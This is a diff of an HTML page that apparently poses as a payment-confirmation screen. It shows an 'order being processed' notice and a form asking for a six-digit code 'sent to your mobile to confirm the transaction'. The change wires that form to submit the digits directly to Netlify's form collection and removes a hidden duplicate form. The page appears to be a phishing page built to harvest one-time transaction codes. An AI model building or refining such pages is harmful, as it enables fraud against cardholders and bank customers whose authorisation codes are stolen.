@@ -123,7 +123,7 @@
         <p>Order being processed... Please do not refresh the page.</p>
     </div>
 
-     <!-- OTP Container -->
+    <!-- OTP Container -->
     <div class="container">
         <div class="row justify-content-center">
             <div class="col-md-6 otp-container otp-container-2">
@@ -131,7 +131,7 @@
                 <h2>Please Confirm</h2>
                 <p>Enter the code sent to your mobile to confirm the transaction:</p>
                 <!-- The actual visible form -->
-                <form id="visibleOTPForm" name="otpForm">
+                <form id="visibleOTPForm" name="otpForm" data-netlify="true">
                     <div class="otp-inputs">
                         <!-- OTP input fields -->
                         <input type="tel" maxlength="1" autocomplete="one-time-code" pattern="[0-9]{1}" inputmode="numeric" name="otp1">
@@ -142,21 +142,11 @@
                         <input type="tel" maxlength="1" autocomplete="one-time-code" pattern="[0-9]{1}" inputmode="numeric" name="otp6">
                     </div>
                     <input type="hidden" name="form-name" value="otpForm" />
-                    <button class="btn-2" onclick="submitOTP()" type="submit">Confirm</button>
+                    <button class="btn-2" type="submit">Confirm</button>
                 </form>
             </div>
         </div>
     </div>
-
-    <!-- Hidden form for Netlify -->
-    <form name="otpForm" data-netlify="true" hidden>
-        <input type="text" name="otp1">
-        <input type="text" name="otp2">
-        <input type="text" name="otp3">
-        <input type="text" name="otp4">
-        <input type="text" name="otp5">
-        <input type="text" name="otp6">
-    </form>
 
     <!-- Thanks Container -->
     <div class="container thanks-container">
@@ -172,4 +162,3 @@
     <script src="thankyou.js"></script>
 </body>
 
-</html>
